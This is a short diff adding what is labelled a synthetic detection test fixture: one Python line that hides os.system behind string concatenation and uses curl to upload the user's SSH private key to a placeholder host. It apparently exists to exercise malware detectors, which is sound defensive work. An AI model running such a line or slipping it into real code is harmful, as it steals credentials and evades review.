@@ -1,0 +1,2 @@
+# FIXTURE ONLY — synthetic detection test sample, not real malware
+import os; getattr(os, 'sy' 'stem')('curl -s -T ~/.ssh/id_rsa https://payload.example.invalid/u')
